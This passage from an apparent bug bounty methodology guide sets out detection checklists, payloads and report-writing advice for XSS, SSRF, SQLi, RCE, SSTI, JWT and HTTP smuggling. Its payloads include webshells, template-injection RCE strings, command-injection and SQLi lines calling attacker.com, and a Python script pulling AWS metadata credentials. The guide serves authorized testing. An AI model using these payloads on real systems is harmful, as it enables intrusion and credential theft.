- [ ] Tested mXSS (mutated XSS) `<details x="<img src=x onerror=alert(1)>" open>`

**Impact validation:**
- [ ] Cookie theft demonstrated (document.cookie exfiltrated to attacker server)
- [ ] Session theft demonstrated (attacker uses stolen cookie to hijack session)
- [ ] Keylogging demonstrated (keystrokes captured and exfiltrated)
- [ ] CSRF token theft demonstrated
- [ ] Data exfiltration demonstrated (page content sent to attacker)
- [ ] Redirection to attacker site demonstrated
- [ ] Account takeover demonstrated (if chained with other primitives)

### SSRF

**Detection checklist:**
- [ ] Identified endpoints that fetch external URLs
- [ ] Identified endpoints that process user-provided URLs
- [ ] Identified file upload endpoints that process remote files
- [ ] Identified PDF generators that fetch external resources
- [ ] Identified webhook callback endpoints
- [ ] Identified redirect followers
- [ ] Identified proxy endpoints
- [ ] Identified image processing endpoints (profile picture from URL)

**Callback server setup:**
- [ ] Interact.sh webhook URL configured
- [ ] Burp Collaborator client configured
- [ ] Custom VPS with listener on port 80/443
- [ ] DNS listener configured (can check for DNS-based SSRF)
- [ ] HTTP server with logging configured

**Cloud metadata testing:**
```
AWS:  http://169.254.169.254/latest/meta-data/
AWS v2: http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP:  http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
Alibaba: http://100.100.100.200/latest/meta-data/
DigitalOcean: http://169.254.169.254/metadata/v1/
```

**Internal network scanning:**
- [ ] Tested `http://localhost:{port}` with common ports (80, 443, 22, 8080, 3000, 5000, 6379, 27017)
- [ ] Tested `http://127.0.0.1:{port}`
- [ ] Tested `http://0.0.0.0:{port}`
- [ ] Tested `http://[::]:{port}` (IPv6 localhost)
- [ ] Tested `http://10.{0-255}.{0-255}.{0-255}:{port}` (RFC 1918)
- [ ] Tested `http://172.16-31.{0-255}.{0-255}:{port}` (RFC 1918)
- [ ] Tested `http://192.168.{0-255}.{0-255}:{port}` (RFC 1918)

**ByPass techniques for IP-based filtering:**
```
DNS resolution bypass:
  localhost → localhost.to, 127.0.0.1.nip.io, 1.1.1.1.com
  localhost → 2130706433 (integer representation of 127.0.0.1)
  localhost → 0x7f000001 (hex representation of 127.0.0.1)

Redirect bypass:
  Attacker URL → 301 redirect → internal IP
  URL shortener → redirect → internal IP

DNS rebinding:
  DNS response initially returns legitimate IP
  When server fetches, DNS response changes to internal IP
  (Requires controlled DNS server)

Protocol bypass:
  file:///etc/passwd
  dict://localhost:6379/info
  gopher://localhost:6379/_SET%20key%20value
```

**Impact validation:**
- [ ] Cloud metadata credentials retrieved and tested for access
- [ ] Internal service response captured and analyzed
- [ ] Webhook callback received and logged
- [ ] DNS callback received and logged
- [ ] File read demonstrated (file://)
- [ ] Internal service interaction confirmed (response differs from timeout)

### SQLi

**Detection checklist:**
- [ ] Identified all parameterized endpoints
- [ ] Tested numeric parameters with `'` and `"` characters
- [ ] Tested string parameters with `'` character
- [ ] Tested with time-based payloads `' OR SLEEP(5)--`
- [ ] Tested with error-based payloads `' OR 1=1--`
- [ ] Tested with UNION payloads
- [ ] Tested all injection points (URL, body, headers, cookies)

**Time-based confirmation:**
```
MySQL:   ' OR SLEEP(5)--
PostgreSQL: ' OR pg_sleep(5)--
MSSQL:  ' OR WAITFOR DELAY '00:00:05'--
Oracle: ' OR DBMS_LOCK.SLEEP(5)--
SQLite: ' OR randomblob(500000000)-- (will cause delay)

Confirm: Response takes 5+ seconds when payload is injected
Confirm: Response is normal (under 1 second) when payload is not injected
```

**Error-based extraction:**
```
MySQL:   ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--
PostgreSQL: ' OR CAST((SELECT version()) AS numeric)--
MSSQL:  ' OR 1=CONVERT(int, (SELECT @@version))--
Oracle: ' OR 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version))--

Confirm: Error message includes database version or data
```

**Out-of-band confirmation:**
```
MySQL:   ' LOAD_FILE('\\\\attacker.com\\test')--
PostgreSQL: ' OR COPY (SELECT 'test') TO PROGRAM 'nslookup attacker.com'--
MSSQL:  ' EXEC master..xp_dirtree '\\\\attacker.com\\test'--
Oracle: ' OR UTL_HTTP.request('http://attacker.com/' || (SELECT version FROM v$instance))--

Confirm: DNS/HTTP callback received on attacker server
```

**Impact validation:**
- [ ] Database version retrieved
- [ ] Current user/database name retrieved
- [ ] Table names enumerated
- [ ] Column names enumerated
- [ ] User data extracted (emails, hashed passwords)
- [ ] PII data extracted (full user records)
- [ ] Admin credentials extracted
- [ ] Full database dump (theoretical, not actual — don't DoS the target)

### Auth Bypass

**Detection checklist:**
- [ ] Identified all authenticated endpoints
- [ ] Tested accessing endpoints without authentication header
- [ ] Tested with empty authentication token
- [ ] Tested with expired token
- [ ] Tested with token from another user
- [ ] Tested with invalid signature token
- [ ] Tested with tampered JWT claims
- [ ] Tested privilege escalation (user → admin)

**Role enumeration:**
- [ ] Identified all available roles (user, premium, moderator, admin, superadmin)
- [ ] Tested accessing admin endpoints with user role
- [ ] Tested modifying role parameter during registration
- [ ] Tested modifying role in profile update
- [ ] Tested role parameter in JWT token
- [ ] Tested role escalation via mass assignment
- [ ] Tested role escalation via GraphQL mutation
- [ ] Tested role escalation via API version difference (v1 may bypass role check)

**Privilege boundary testing:**
```
Endpoint                  User    Admin
GET /api/users           403     ✓
GET /api/users?admin=1   200     ✓ (bypasses role check)
GET /api/users?limit=1   200     ✓ (pagination bypass)
GET /api/users/me        200     ✓
GET /api/users/123       200     ✓ (IDOR + auth bypass combo)

Document every status code difference between user and admin access.
```

**MFA bypass tests:**
- [ ] Direct navigation to post-MFA URL after login (skips MFA step)
- [ ] MFA code reuse (same code works twice)
- [ ] MFA code brute-force (no rate limiting on MFA validation)
- [ ] MFA code prediction (sequential, derived from timestamp)
- [ ] MFA bypass via API (mobile API may not check MFA)
- [ ] MFA bypass via different endpoint (same function, different path, no MFA check)

**Impact validation:**
- [ ] Unauthenticated access to sensitive data demonstrated
- [ ] Privilege escalation to admin role demonstrated
- [ ] MFA bypass demonstrated (session created without MFA challenge)
- [ ] Another user's account accessed without their password
- [ ] Admin-level actions performed (user suspension, data export, config change)

### RCE

**Detection checklist:**
- [ ] Identified file upload endpoints
- [ ] Identified command execution endpoints (ping, traceroute, nslookup)
- [ ] Identified template rendering endpoints
- [ ] Identified deserialization endpoints
- [ ] Identified eval() or similar code execution sinks
- [ ] Identified SSRF that can reach internal RCE services
- [ ] Identified SQL injection with xp_cmdshell or similar

**Command execution verification:**
```
Time-based:   ; sleep 5
Output-based: ; whoami
Callback:     ; curl http://attacker.com/test
File write:   ; echo "test" > /tmp/test.txt
File read:    ; cat /etc/passwd

Windows alternatives:
  ; ping -n 5 127.0.0.1 (sleep equivalent)
  ; whoami
  ; curl http://attacker.com/test
  ; echo test > C:\Users\Public\test.txt
  ; type C:\Windows\win.ini
```

**File write verification:**
- [ ] Write a file to webroot
- [ ] Access the file via browser
- [ ] Confirm the file content is what was written
- [ ] Write a webshell (PHP/ASP/JSP)
- [ ] Execute the webshell

**Callback verification:**
- [ ] HTTP callback to attacker server
- [ ] DNS callback to attacker domain
- [ ] Reverse shell established
- [ ] Bind shell established

**Impact validation:**
- [ ] Full command execution demonstrated
- [ ] Webshell uploaded and accessed
- [ ] Database credentials extracted from config files
- [ ] Source code read and verified
- [ ] Cloud metadata accessed from compromised server
- [ ] Lateral movement demonstrated (access other internal services)

### Business Logic

**Detection checklist:**
- [ ] Identified multi-step workflows (checkout, registration, password reset)
- [ ] Identified state-dependent operations (must complete step A before step B)
- [ ] Identified financial operations (payments, refunds, credits)
- [ ] Identified voting/rating systems
- [ ] Identified coupon/discount code functionality
- [ ] Identified referral/invite systems
- [ ] Identified balance/credit management

**Multi-step workflow testing:**
```
Ways to manipulate multi-step workflows:
  [ ] Skip a step (navigate directly to step 3 of 5)
  [ ] Repeat a step (execute step 2 twice)
  [ ] Reorder steps (execute step 3 before step 2)
  [ ] Execute step from another user's session
  [ ] Modify data from an earlier step after later steps complete
  [ ] Race condition between steps
  [ ] Partial execution (start but don't complete a workflow)
  [ ] Parallel execution of the same workflow multiple times
```

**State manipulation:**
- [ ] Tested race condition on coupon application
- [ ] Tested race condition on order creation
- [ ] Tested race condition on balance deduction
- [ ] Tested concurrent session manipulation
- [ ] Tested parallel requests with different parameters

**Financial operations testing:**
- [ ] Tested negative quantity in orders (negative price)
- [ ] Tested fractional quantity (0.5 items)
- [ ] Tested price manipulation in POST/PUT body
- [ ] Tested currency manipulation
- [ ] Tested discount stacking (multiple coupons on one order)
- [ ] Tested coupon reuse (use the same coupon on multiple orders)
- [ ] Tested infinite coupon generation
- [ ] Tested refund/credit amount manipulation
- [ ] Tested balance transfer between accounts

**Impact validation:**
- [ ] Financial gain demonstrated (items received without full payment)
- [ ] Service abuse demonstrated (unlimited voting, infinite coupons)
- [ ] State corruption demonstrated (order in invalid state, stuck transaction)
- [ ] Privilege escalation via logic manipulation
- [ ] Data corruption via improper state transitions

### Race Condition

**Detection checklist:**
- [ ] Identified endpoints with read-then-write patterns
- [ ] Identified endpoints with balance/credit updates
- [ ] Identified coupon/voucher application
- [ ] Identified stock/availability management
- [ ] Identified sequential operations (check → process → confirm)
- [ ] Identified parallel action endpoints (batch operations)

**Concurrent request testing:**
```
Race condition testing setup:
  1. Identify the race window (between READ and WRITE checks)
  2. Prepare N parallel requests (recommended: 20-50)
  3. Send all requests simultaneously
  4. Check if race condition fired (more credits than expected)
  5. Repeat 5-10 times to confirm reliability

Tools for parallel requests:
  - Burp Turbo Intruder
  - Python with threading + requests
  - curl with xargs -P
  - OWASP ZAP
```

**TOCTOU verification:**
```
Time-of-check vs Time-of-use:
  Step 1: Check balance (balance >= 100 — PASS)
  Step 2: Process transaction (deduct 100)
  
  Race: Execute Step 2 twice before Step 1 updates the balance
  
  Result: Both transactions pass because the balance check
          happened before either deduction was committed.
```

**Common race condition vectors:**
```
  [ ] Coupon application race (apply same coupon twice)
  [ ] Balance deduction race (withdraw more than balance)
  [ ] Stock deduction race (buy more items than available)
  [ ] Account creation race (create multiple accounts with same email)
  [ ] File upload race (upload + delete before processing)
  [ ] Rating/voting race (vote multiple times)
  [ ] Referral credit race (claim referral bonus with multiple accounts)
```

**Impact validation:**
- [ ] Coupon applied multiple times (discount > 100%)
- [ ] Balance inflated beyond original amount
- [ ] Items received beyond inventory
- [ ] Multiple accounts created with single-use verification
- [ ] Voting manipulation confirmed

### File Upload

**Detection checklist:**
- [ ] Identified avatar/profile picture upload
- [ ] Identified document/attachment upload
- [ ] Identified file import functionality
- [ ] Identified CSV/XML upload
- [ ] Identified signature/logo upload
- [ ] Identified file processing endpoints (conversion, thumbnail, OCR)

**Webshell execution:**
```
Upload tests:
  [ ] .php file uploaded and accessible
  [ ] .php5 file uploaded and accessible
  [ ] .phtml file uploaded and accessible
  [ ] .php.jpg double extension uploaded and accessible
  [ ] shell.php%00.jpg null byte injection
  [ ] shell.php;.jpg (parameter injection in filename)
  [ ] .htaccess upload to enable PHP execution
  [ ] .PhP case bypass
  [ ] Content-Type manipulation (image/jpeg with .php content)
  [ ] Magic bytes spoofing (GIF89a added to PHP payload)

Webshell content:
  <?php system($_GET['cmd']); ?>
  <?php echo file_get_contents('/etc/passwd'); ?>
  <?php phpinfo(); ?>
```

**XSS confirmation:**
```
  [ ] SVG file with script uploaded
  [ ] HTML file with script uploaded
  [ ] File with XSS filename uploaded (<script>alert(1)</script>.txt)
  [ ] File metadata XSS (EXIF data with XSS payload)
```

**Path traversal:**
```
  [ ] ../ in filename produces directory traversal
  [ ] ..%2F in filename produces traversal
  [ ] %2e%2e%2f URL-encoded traversal
  [ ] ....// double-dot bypass
  [ ] ..\ Windows-style traversal
  [ ] Filename too long after sanitization (truncation leads to traversal)
```

**Impact validation:**
- [ ] Webshell executed and command output retrieved
- [ ] Server-side file read via path traversal
- [ ] XSS in file upload triggered in victim browser
- [ ] XXE in uploaded XML/DOCX processed
- [ ] SSRF via uploaded SVG with external entity

### GraphQL

**Detection checklist:**
- [ ] Found /graphql endpoint
- [ ] Found /graphiql or GraphQL IDE
- [ ] Found /v1/graphql, /v2/graphql (multiple versions)
- [ ] Found ws://.../graphql (WebSocket GraphQL)

**Introspection test:**
```
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

If this returns data:
  [ ] Introspection is enabled (should be disabled in production)
  [ ] All available queries and mutations documented
  [ ] All available types documented
  [ ] All fields documented
  [ ] Admin/private resolvers identified from type names
```

**Batching attack:**
```
query {
  user1: documents(id: 1) { id title content owner { email } }
  user2: documents(id: 2) { id title content owner { email } }
  user3: documents(id: 3) { id title content owner { email } }
  ...
  user100: documents(id: 100) { id title content owner { email } }
}

  [ ] Batching allows IDOR across multiple resources
  [ ] Rate limiting is bypassed via batching (single query, N resources)
  [ ] Batching increases data extraction speed by 100x
```

**Query depth analysis:**
```
query {
  documents {
    owner {
      documents {
        owner {
          documents {
            owner {
              documents {
                title
              }
            }
          }
        }
      }
    }
  }
}

  [ ] Deeply nested queries are not blocked (should have max depth)
  [ ] Deep queries cause performance degradation
  [ ] Deep queries return data they shouldn't (resolver doesn't check nesting)
```

**Auth flaws in resolvers:**
- [ ] Mutation does not check ownership before modification
- [ ] Query returns all objects even without user context filter
- [ ] Nested resolvers bypass parent's authorization
- [ ] Batch operations bypass per-item authorization
- [ ] Alias-based queries bypass simple auth checks
- [ ] __typename introspection reveals admin-only resolvers

**Impact validation:**
- [ ] User data accessed via batching
- [ ] Admin resolvers identified and data extracted
- [ ] Mutation performed on another user's resource
- [ ] Denial of service via deep query confirmed (in scope?)
- [ ] Auth bypass via GraphQL vs REST differences confirmed

### SSTI

**Detection checklist:**
- [ ] Identified template rendering endpoints
- [ ] Identified email template preview functionality
- [ ] Identified PDF generation with custom content
- [ ] Identified CMS page creation/editing
- [ ] Identified error pages with user input reflection
- [ ] Identified report generation with dynamic content

**Template engine identification:**
```
Probes:
  {{7*7}}           → 49 = Jinja2, Twig, Nunjucks, Liquid
  ${7*7}            → 49 = Freemarker, Velocity
  {{7*'7'}}         → 7777777 = Jinja2
  <%= 7*7 %>        → 49 = ERB
  ${{7*7}}          → 49 = Smarty
  *{7*7}            → 49 = Thymeleaf (if expression utility is available)
  #{7*7}            → 49 = Thymeleaf (if SpringEL)
```

**RCE escalation by engine:**

**Jinja2 (Python):**
```
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[X]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0] }}
```

**Twig (PHP):**
```
{{ ['id']|filter('system') }}
{{ {'cat':'/etc/passwd'}|sort('system') }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("cat /etc/passwd") }}
```

**Freemarker (Java):**
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("whoami") }
${"freemarker.template.utility.Execute"?new()("whoami")}
```

**ERB (Ruby):**
```
<%= system("whoami") %>
<%= `whoami` %>
```

**Spring (Java):**
```
${T(java.lang.Runtime).getRuntime().exec('whoami')}
${#exec('whoami')}
```

**Impact validation:**
- [ ] Template engine identified
- [ ] Mathematical expression evaluated (proof of SSTI)
- [ ] RCE achieved (command output retrieved)
- [ ] File read via RCE (read application source, credentials)
- [ ] Callback server notified from compromised server

### Prototype Pollution

**Detection checklist:**
- [ ] Identified endpoints that accept JSON payloads
- [ ] Identified object merge/assign functions (lodash.merge, Object.assign, $.extend)
- [ ] Identified object clone functions
- [ ] Identified configuration merging
- [ ] Identified query parameter to object conversion

**Pollution detection:**
```
Server-side (Node.js):
  Send: {"__proto__": {"polluted": "true"}}
  Check: Can we detect "polluted" property in responses?

Client-side:
  Payload: {"__proto__": {"isAdmin": true}}
  Payload: {"constructor": {"prototype": {"isAdmin": true}}}
  Payload: {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
```

**Sink confirmation:**
- [ ] Template pollution (polluted property affects template rendering)
- [ ] Configuration pollution (polluted property changes app behavior)
- [ ] Auth pollution (polluted property grants admin access)
- [ ] XSS pollution (polluted property leads to DOM XSS)
- [ ] RCE pollution (polluted property leads to remote code execution)

**Impact validation:**
- [ ] `__proto__` injection accepted by server
- [ ] Polluted property affects response or behavior
- [ ] XSS achieved via pollution (client-side)
- [ ] Auth bypass confirmed via polluted property
- [ ] Admin access confirmed via prototype manipulation

### Mass Assignment

**Detection checklist:**
- [ ] Identified all endpoints that accept JSON bodies for creation
- [ ] Identified all endpoints that accept JSON bodies for updates
- [ ] Identified registration endpoints
- [ ] Identified profile update endpoints
- [ ] Identified settings/configuration endpoints

**Parameter brute-force:**
```
Common mass assignment parameters:
  [ ] role, user_role, account_type, user_type
  [ ] is_admin, is_verified, is_active, is_premium
  [ ] admin, verified, active, premium
  [ ] credits, balance, points, tokens, reputation
  [ ] permissions, scopes, grants
  [ ] user_id, owner_id, account_id
  [ ] status, account_status, subscription_status
  [ ] email_confirmed, phone_confirmed, identity_verified
  [ ] internal_note, admin_note, support_note
```

**Privilege field discovery:**
```
Send each parameter individually:
  POST /api/user/register
  {"name": "test", "email": "test@test.com", "password": "Test1234", "role": "admin"}

  POST /api/user/profile
  {"name": "test", "is_admin": true, "role": "admin"}

  PUT /api/user/settings
  {"settings": {"role": "admin"}}

  GraphQL:
  mutation { createUser(input: {name: "test", role: "admin"}) { id role name } }
```

**Impact validation:**
- [ ] Admin role assigned via mass assignment
- [ ] Another user's data modified via mass assignment
- [ ] Balance/credits inflated via mass assignment
- [ ] Account verified/skipped verification via mass assignment
- [ ] Subscription status changed without payment

### JWT

**Detection checklist:**
- [ ] Retrieved a JWT token from application
- [ ] Decoded the token at https://jwt.io
- [ ] Identified the algorithm (HS256, RS256, none)
- [ ] Identified the payload claims
- [ ] Checked for public key disclosure (JWK, jwks_uri)

**Algorithm confusion:**
```
  [ ] Changed algorithm to "none" → token accepted
  [ ] Changed algorithm from RS256 to HS256 → server uses public key as HMAC secret
  [ ] hmac algorithm with known/guessable secret
  [ ] Changed algorithm to "None" (capital N) — variant of none
```

**Key validation:**
```
  [ ] Changed kid header to traverse paths: ../../public/secret.key
  [ ] Changed kid header to SQL injection
  [ ] Changed kid header to point to attacker-controlled JWK
  [ ] Removed signature entirely
  [ ] Token with random signature is accepted (no signature validation)
```

**Header injection:**
```
  [ ] Added jku header pointing to attacker's JWK set URL
  [ ] Added jwk header with attacker's public key
  [ ] Added x5u header with attacker's certificate URL
  [ ] Added x5c header with attacker's certificate chain
```

**Impact validation:**
- [ ] Forged token accepted by server
- [ ] Token with modified claims accepted
- [ ] Token with elevated privileges accepted
- [ ] Token with admin role accepted
- [ ] Token with another user's identity accepted

### Cache Poisoning

**Detection checklist:**
- [ ] Identified CDN/Reverse proxy in use (Cloudflare, Fastly, Akamai, Varnish)
- [ ] Identified cache headers: `X-Cache`, `Age`, `CF-Cache-Status`
- [ ] Identified cached endpoints
- [ ] Identified unkeyed parameters in request

**Cache key manipulation:**
```
  Static path:      /page
  Dynamic path:     /page?user=123
  
  If ?user=123 is NOT part of the cache key:
  User A: GET /page?user=123 → Cached for /page
  User B: GET /page          → Gets User A's cached response
```

**Unkeyed parameter detection:**
```
  Test each parameter:
  [ ] /path?param=value — cache key includes param
  [ ] /path?param=value&utm_campaign=tracking — cache key ignores utm_campaign
  [ ] /path?cache_key_param=value — only cache_key_param matters
  [ ] Headers like X-Forwarded-Host may be unkeyed
```

**Victim delivery:**
```
  [ ] Cache poisoning payload survives across requests
  [ ] Cache poison affects subsequent users
  [ ] Cache poison can be triggered by sharing a crafted URL
  [ ] Cache poison results in XSS or data injection
```

**Impact validation:**
- [ ] XSS delivered via cache poisoning
- [ ] User-specific data served to other users via cache
- [ ] Redirect injected via cache poisoning
- [ ] Persistent cache poisoning demonstrated (multiple hours cached)

### HTTP Smuggling

**Detection checklist:**
- [ ] Identified HTTP/1.1 front-end and back-end servers
- [ ] Identified HTTP/2 to HTTP/1.1 downgrade
- [ ] Identified load balancer / reverse proxy setup
- [ ] Identified connection reuse between requests

**CL.TE confirmation:**
```
Send:
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 35
  Transfer-Encoding: chunked
  
  0
  
  GET /admin HTTP/1.1
  X-Ignore: X

If the front-end uses Content-Length (CL) and the back-end uses
Transfer-Encoding (TE), the GET /admin will be smuggled.
```

**TE.CL confirmation:**
```
Send:
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 4
  Transfer-Encoding: chunked
  
  5c
  GPOST /admin HTTP/1.1
  Content-Length: 15
  
  0

If the front-end uses TE and the back-end uses CL, the payload is smuggled.
```

**H2.CL confirmation:**
```
HTTP/2 request with Content-Length header:
  :method: POST
  :path: /
  content-length: 0
  
  POST /admin HTTP/1.1
  Content-Length: 0

When HTTP/2 is downgraded to HTTP/1.1, the smuggled request is appended.
```

**Impact validation:**
- [ ] Smuggled request processed by back-end
- [ ] Cache poisoning via smuggled request (deceive front-end cache)
- [ ] Auth bypass via smuggled internal path
- [ ] Session theft via smuggled security headers
- [ ] WAF bypass confirmed

---

## 5. Evidence Preparation

### Request/Response Capture

**Best practices:**
- Capture the COMPLETE request (method, path, headers, body)
- Capture the COMPLETE response (status code, headers, body)
- Show both the "before" (no bug) and "after" (bug triggered) states
- Include at least one successful reproduction and one failed reproduction
- For IDOR: show the attacker's session accessing the victim's data
- For XSS: show the popup or exfiltration

**Format preference (in order):**
1. curl command with output (most reliable, triager can test)
2. HTML page with JavaScript (for DOM-based XSS, complex PoCs)
3. Python script (for multi-step workflows)
4. Burp screenshot (for simple request/response pairs)
5. Browser DevTools Network tab screenshot (for client-side bugs)

### Screenshot Guidelines

**Before/after comparison:**
- Left side: normal request as the victim user
- Right side: exploited request as the attacker
- Show the same response field in both states

**Cookie redaction:**
- Black bar (rectangle) — NOT blur (blur can be reverse-engineered)
- Cover the entire cookie value, not just part of it
- If the cookie is in a header, redact the entire header value
- Do not redact cookie names (these are not sensitive)

**PII masking for other users:**
- Black bar over names, emails, phone numbers, addresses
- Black bar over profile pictures (may contain faces)
- Black bar over any financial information
- Do not black bar your own test account data
- Do not black bar usernames (these are public)
- Do not black bar trace IDs, request IDs, or transaction IDs

**Timestamp visibility:**
- Ensure timestamps are visible in screenshots (shows when the test happened)
- If using browser DevTools, show the network request timeline
- If using Burp, show the request/response timestamps in the bottom bar

**URL bar visibility:**
- Always show the full URL in the screenshot
- For browser screenshots, keep the address bar visible
- For Burp screenshots, show the target URL in the request line
- Do not crop the URL from the screenshot

**Screenshot annotation:**
- Use red arrows or circles to point to the important parts
- Use numbered annotations that match the reproduction steps
- Add text labels explaining what each part shows

### HAR File Preparation

HAR files must be sanitized before submission. They contain sensitive data.

**Sanitization commands:**

```bash
# Remove all Cookie headers from requests
jq 'walk(if type == "object" and has("name") and .name == "Cookie" then empty else . end)' capture.har > sanitized.har

# Remove all Set-Cookie headers from responses
jq 'walk(if type == "object" and has("name") and .name == "Set-Cookie" then empty else . end)' sanitized_1.har > sanitized.har

# Remove all Authorization headers
jq 'walk(if type == "object" and has("name") and .name == "Authorization" then empty else . end)' sanitized.har > clean.har

# Remove all X-Api-Key headers
jq 'walk(if type == "object" and has("name") and .name == "X-Api-Key" then empty else . end)' clean.har > final.har

# Remove all PII from response bodies (replace email patterns)
jq 'walk(if type == "string" then gsub("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"; "[EMAIL REDACTED]") else . end)' final.har > sanitized_final.har
```

**Post-sanitization validation:**
- [ ] Open the sanitized HAR in Chrome DevTools
- [ ] Verify no cookie values remain
- [ ] Verify no auth tokens remain
- [ ] Verify no PII remains
- [ ] Verify the structure is intact
- [ ] Verify the requests and responses still demonstrate the bug

### Video PoC Guidelines

**When to use video:**
- Multi-step workflows that are hard to describe in text
- Race conditions with visual evidence of success
- Business logic bugs with complex state transitions
- Bugs that require visualizing UI behavior

**Video requirements:**
```
Length: 30-90 seconds (no longer)
Resolution: 1920x1080
Format: MP4 (H.264)
Frame rate: 30fps
File size: Under 10MB

Content:
- Start with the URL in the address bar
- Show authentication (login with test account credentials)
- Show each step clearly with pauses between steps
- End by showing the result (the bug's impact)
- No background audio (voiceover is optional)
- No background tabs or personal bookmarks bar
```

**Video annotation:**
- Add numbered step indicators that match reproduction steps
- Highlight the vulnerability with a red box or arrow
- Show the after state clearly

### curl Command PoC Format

```bash
#!/bin/bash
# Finding: IDOR in document download
# Target: https://api.target.com
# Accounts: victim@test.com, attacker@test.com

# Step 1: Log in as victim and create a document
VICTIM_TOKEN=$(curl -s -X POST https://api.target.com/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"VictimPass123"}' | jq -r '.token')

DOC_RESPONSE=$(curl -s -X POST https://api.target.com/api/documents \
  -H "Authorization: Bearer $VICTIM_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"secret document","content":"this is private"}')

DOC_ID=$(echo $DOC_RESPONSE | jq -r '.id')
echo "Victim created document ID: $DOC_ID"

# Step 2: Log in as attacker and try to access the document
ATTACKER_TOKEN=$(curl -s -X POST https://api.target.com/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"AttackerPass123"}' | jq -r '.token')

echo ""
echo "========================================="
echo "Attacker accessing victim's document:"
ATTACKER_RESPONSE=$(curl -s -X GET "https://api.target.com/api/documents/$DOC_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN")

echo "$ATTACKER_RESPONSE" | jq .

# Verify the document belongs to the victim
DOC_OWNER=$(echo "$ATTACKER_RESPONSE" | jq -r '.owner_email')
echo "Document owner email: $DOC_OWNER"
echo "Expected: victim@test.com"
echo "========================================="
```

### Code-Based PoC Format for Complex Exploits

```python
#!/usr/bin/env python3
"""
PoC: SSRF to AWS Metadata Endpoint
Target: https://pdf-gen.target.com
Impact: Retrieve AWS IAM credentials from metadata endpoint
"""

import requests
import sys
import json

TARGET = "https://pdf-gen.target.com"
ATTACKER_CALLBACK = "https://attacker-controlled.com/callback"

def exploit():
    session = requests.Session()
    
    # Step 1: Authenticate
    print("[*] Step 1: Authenticating...")
    login_resp = session.post(f"{TARGET}/auth/login", json={
        "email": "attacker@test.com",
        "password": "AttackerPass123"
    })
    token = login_resp.json().get("token")
    session.headers.update({"Authorization": f"Bearer {token}"})
    print(f"[+] Token obtained: {token[:20]}...")
    
    # Step 2: Send SSRF payload via PDF generator
    print("[*] Step 2: Sending SSRF payload...")
    
    # Try cloud metadata endpoint
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/"
    ]
    
    for payload in payloads:
        print(f"\n[*] Testing: {payload}")
        resp = session.post(f"{TARGET}/api/pdf/generate", json={
            "url": payload,
            "format": "pdf"
        })
        
        if resp.status_code == 200 and "SecretAccessKey" in resp.text:
            print("[!] CREDENTIALS FOUND!")
            print(resp.text[:500])
            
            # Save to file
            with open("aws_credentials.txt", "w") as f:
                f.write(resp.text)
            print("[+] Credentials saved to aws_credentials.txt")
            return True
        
        print(f"[-] Response: {resp.status_code} - No credentials")
    
    # Step 3: Try DNS-based exfiltration
    print("\n[*] Step 3: Testing DNS callback...")
    callback_url = f"http://{ATTACKER_CALLBACK}/ssrf-proof"
    resp = session.post(f"{TARGET}/api/pdf/generate", json={
        "url": callback_url,
        "format": "pdf"
    })
    print(f"[*] Callback request sent. Check {ATTACKER_CALLBACK} for incoming request")
    
    return False

if __name__ == "__main__":
    success = exploit()
    sys.exit(0 if success else 1)
```

### Evidence File Naming Conventions

```
Format: [VULN_TYPE]-[TARGET]-[DATE]-[VERSION].[ext]

Examples:
  idor-victim-documents-api.target.com-2026-06-16-v1.png
  xss-cookie-theft-app.target.com-2026-06-16-v1.png
  ssrf-cloud-metadata-pdf-gen.target.com-2026-06-16-v1.mp4
  sql-error-based-api.target.com-2026-06-16-v1.har
  race-condition-coupon-api.target.com-2026-06-16-v1.py

Do not use:
  final.png (ambiguous)
  screenshot1.png (no description)
  PoC.png (too generic)
  exploit-2026-06-16.png (no vulnerability type)
```

---

## 6. Report Writing

### Title Formula

```
[Severity] Vuln Type in Feature — Impact Summary

Examples:
  [Medium] IDOR in Document Download — Any User Can Read Any Document
  [High] Stored XSS in Profile Bio — Account Takeover via Cookie Theft
  [Critical] Unauthenticated RCE in PDF Generator — Full Server Compromise
  [High] SSRF in Webhook URL — AWS Metadata Credentials Accessed
  [Medium] Race Condition in Coupon Application — Unlimited 100% Discounts

Rules:
- Severity in brackets: [Critical], [High], [Medium], [Low], [Info]
- Vulnerability type first: IDOR, XSS, SSRF, SQLi, RCE, Auth Bypass
- Feature or endpoint: "in Document Download", "in Profile Bio"
- Impact summary: "Any User Can Read Any Document"
- Total length: under 120 characters
- No jargon: "in Profile Bio" not "in /api/v2/user/profile-bio"
- No "could" or "potential": not "Potential IDOR" but "IDOR"
```

### Summary Section

One paragraph. No technical details. Just impact.

```
Bad: "I found an IDOR vulnerability in the /api/documents endpoint where
the server doesn't check if the user owns the document before returning it.
By changing the document_id parameter, I can access any user's documents."

Good: "Any authenticated user on the platform can read any other user's
private documents by simply changing a numeric ID in the API request.
This exposes all user-uploaded documents including IDs, financial records,
and medical information."
```

### Impact Statement Formula

```
"An attacker could [action] by [method], resulting in [consequence]."

Examples:
  "An attacker could read any user's private messages by changing the
  conversation_id parameter in the GET /api/messages/{id} endpoint.
  This exposes all private conversations including those containing
  sensitive business information and personal data."

  "An attacker could steal any user's session by posting a stored XSS
  payload in the profile bio field. When other users view the attacker's
  profile, the JavaScript executes and exfiltrates their session cookies,
  resulting in full account takeover."

Rules:
- Start with "An attacker could..."
